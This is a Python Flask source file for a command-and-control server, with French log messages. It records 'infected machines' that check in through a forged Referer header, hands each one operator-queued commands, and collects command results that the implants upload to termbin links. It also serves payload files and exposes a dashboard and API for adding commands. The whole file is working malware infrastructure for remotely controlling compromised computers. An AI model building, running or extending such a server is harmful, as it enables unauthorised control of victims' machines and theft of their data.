#!/usr/bin/env python3

from flask import Flask, request, render_template, send_from_directory, jsonify
from flask_cors import CORS
from flask.helpers import safe_join

from colorama import init, Fore, Back, Style
from hashlib import md5
import os, requests, datetime

# init time
now = datetime.datetime.now()


# init colorama
init(autoreset=True)

# custom sqlite db methods
import db

app = Flask(__name__)
app.config['FILES_FOLDER'] = "files"
static = safe_join(os.path.dirname(__file__), 'static')


CORS(app, resources={r'/*': {'origins': '*'}})



#--------------------------
# execute all together
# ===============================================
def main():
	database = r"c2.db"

	# create tables
	'''
	sql_create_hosts = """
		CREATE TABLE IF NOT EXISTS hosts (
			host_id INTEGER NOT NULL PRIMARY KEY,
			hostname TEXT NOT NULL
		);
	"""

	# create db conn
	conn = create_connection(database)

	# create tables
	if conn is not None:
		create_table(conn, sql_create_hosts)
		create_table(conn, sql_create_cmdhistory)
	else:
		print("Error! cannot create the database connection")
	'''

	conn = db.create_connection(database)


# ===============================================

# test database
# ===============================================
@app.route("/db")
def testdb():
	main()

	return "ok"
# ===============================================
#--------------------------





# ===============================================
# PRINT COLOR FUNCTIONS
# ===============================================
def success(text):
	print(Style.BRIGHT + Fore.GREEN + text + Fore.RESET + Style.RESET_ALL)

def info(text):
	print(Style.BRIGHT + Fore.BLUE + text + Fore.RESET + Style.RESET_ALL)

def warn(text):
	print(Style.BRIGHT + Fore.YELLOW + text + Fore.RESET + Style.RESET_ALL)











# ===============================================
# APP-RELATED FUNCTIONS
# ===============================================


# insert new host
# ===============================================
def insert_host(conn, hostname, ip):
	sql = 'INSERT INTO hosts(hostname, ip, hash) VALUES (?, ?, ?)'
	lastrowid = db.insert_db(conn, sql, (hostname, ip, md5((hostname+ip).encode('utf-8')).hexdigest()))

	return lastrowid
# ===============================================






@app.route("/")
def phase1():
	ip = request.remote_addr

	# print(request.headers.get("Referer"))
	referrer = request.referrer

	if referrer == None:
		return ""

	# remove the "host:" prefix + pop the "-00" and get core hostname
	hostname = referrer.split(':')[1].split('-')
	hostname.pop(-1)
	hostname = "-".join(hostname)
	info("\n\n== Machine: %s --> / ==\n== %s ==" % (hostname, now.strftime("%Y-%m-%d %H:%M:%S")))

	# get db connection
	conn = db.get_db()


	# check if hostname exists in db
	# sample : [[1, 'DESKTOP-AB123', 'bc60fa448aab00f893d746b9190e2ae0', 'windows', '127.0.0.1']]
	host = (db.get_one_host(hostname)).get_json()

	if not host:
		warn(Fore.RED + "[!] Machine infectée détectée ! (%s)" % (hostname) + Fore.RESET)
		latest_id = insert_host(conn, hostname, ip)
		if latest_id != None:
			success(Fore.GREEN + "[+] Machine infectée '%s(%s)' enregistrée ! " % (hostname, ip) + Fore.RESET)


	# check if command to give to host
	# host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()

	latest_cmd_for_host = (db.get_last_cmd_for_host(hostname)).get_json()

	if (len(latest_cmd_for_host) == 0):
		warn('[i] Pas de commande à donner')
		return ''

	return "123--%s--%s" % (hostname, latest_cmd_for_host[0][0])

# ===============================================



# ===============================================
@app.route("/dashboard")
def dashboard():
	return render_template('index.html')
# ===============================================


# ===============================================
@app.route("/api/hosts/list")
def api_hosts_list():
	hosts = db.api_get_hosts()
	return hosts
# ===============================================


# ===============================================
@app.route("/api/commands/list", methods=['GET'])
def api_commands_list():
	host_id = request.args.get('host_id')
	commands = db.api_get_command(host_id)
	return commands
# ===============================================


# ===============================================
@app.route("/api/commands/add", methods=['POST'])
def api_commands_add():
	params = request.get_json()
	success_status = db.api_add_command(params[0], params[1])
	return success_status
# ===============================================


# endpoint pour recueillir les liens termbin 
# avec la réponse de la commande précédemment exécutée
# ===============================================
@app.route("/answer")
def answer():
	# on recupere hostname + lien termbin via le header Referer
	referrer = request.referrer

	if referrer == None:
		return None

	full_referrer = referrer.split(' -- ')

	host = (full_referrer[0]).split(":")[1].split("-00")[0] # host:<THIS>-00
	resource_url = full_referrer[1].strip()

	info("\n\n== Machine: %s --> /answer ==\n== %s ==" % (host, now.strftime("%Y-%m-%d %H:%M:%S")))
	
	# print("host : " + host)
	# print("resource_url : " + resource_url)

	success_status = db.api_add_answer(host, resource_url)

	success("[+] Nouveau résultat de commande sauvegardé !\n--> URL : " + str(resource_url))


	return success_status
# ===============================================


# serve files
# ===============================================
@app.route("/files/<name>")
def serve_files(name):
	return send_from_directory(
		app.config['FILES_FOLDER'], name, as_attachment=True
	)

